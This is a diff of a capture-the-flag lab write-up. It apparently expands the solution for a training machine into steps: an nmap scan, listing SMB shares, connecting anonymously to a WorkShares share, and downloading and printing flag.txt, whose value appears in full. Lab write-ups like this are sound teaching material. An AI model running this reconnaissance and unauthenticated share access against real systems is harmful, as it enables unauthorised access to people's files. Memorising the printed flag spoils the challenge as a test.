@@ -28,7 +28,13 @@
 
 ---
 ## Solution:
-Get the flag via SMB:
+First, we need to scan the target with `nmap`.
+
+Command:
+`nmap -n -sC -sV 10.129.229.124`
+`-n`: No DNS look up (Good [OPSEC](https://en.wikipedia.org/wiki/Operations_security)).
+`-sC`: Run scripts during scan.
+`-sV`: Try to detect the version of running services.
 
 ```console
 ┌──(kali㉿kali)-[~/Downloads]
@@ -43,9 +49,15 @@ PORT    STATE SERVICE       VERSION
 445/tcp open  microsoft-ds?
 Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.82 seconds
+```
 
+It's running SMB on port 445. We can use `smbclient` to connect. 
+
+Smbclient: `smbclient -L 10.129.229.124`
+`-L`: Get a list of shares available on a host.
+
+```
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ smbclient -L 10.129.229.124
 Enter WORKGROUP\kali's password: 
@@ -59,11 +71,25 @@ Enter WORKGROUP\kali's password:
 Reconnecting with SMB1 for workgroup listing.
 do_connect: Connection to 10.129.229.124 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
 Unable to connect with SMB1 -- no workgroup available
+```
 
+Awesome, there is a share for us to poke around in. To access it, we need to follow a special syntax.
+
+Command:
+ `smblient \\\\10.129.229.124\\WorkShares`
+`\\\\`: Equals to "\\\\" when interpreted, means root of directory.
+`\\`: Equals to "\\" when interpreted, means new directory level.
+
+```
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ smbclient \\\\10.129.229.124\\WorkShares
 Enter WORKGROUP\kali's password: 
 Try "help" to get a list of possible commands.
+```
+
+`ls` to show the contents of the share.
+
+```
 smb: \> ls
   .                                   D        0  Tue Apr 12 11:37:11 2022
   ..                                  D        0  Tue Apr 12 11:37:11 2022
@@ -71,6 +97,11 @@ smb: \> ls
   James.P                             D        0  Thu Jun  3 04:38:03 2021
 
                 5114111 blocks of size 4096. 1751219 blocks available
+```
+
+`cd` to change directory into the James.P folder. 
+
+```
 smb: \> cd James.P
 smb: \James.P\> ls
   .                                   D        0  Thu Jun  3 04:38:03 2021
@@ -78,10 +109,21 @@ smb: \James.P\> ls
   flag.txt                            A       32  Mon Mar 29 05:26:57 2021
 
                 5114111 blocks of size 4096. 1751219 blocks available
+```
+
+We can see the flag. We can use `get` to download the file via SMB.
+
+Type `exit` to gracefully close the connection afterwards.
+
+```
 smb: \James.P\> get flag.txt
 getting file \James.P\flag.txt of size 32 as flag.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
 smb: \James.P\> exit
-         
+```
+
+Now that we have the file, we just need to `cat` it.
+
+```
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ cat flag.txt
 5f61c10dffbc77a704d76016a22f1664 
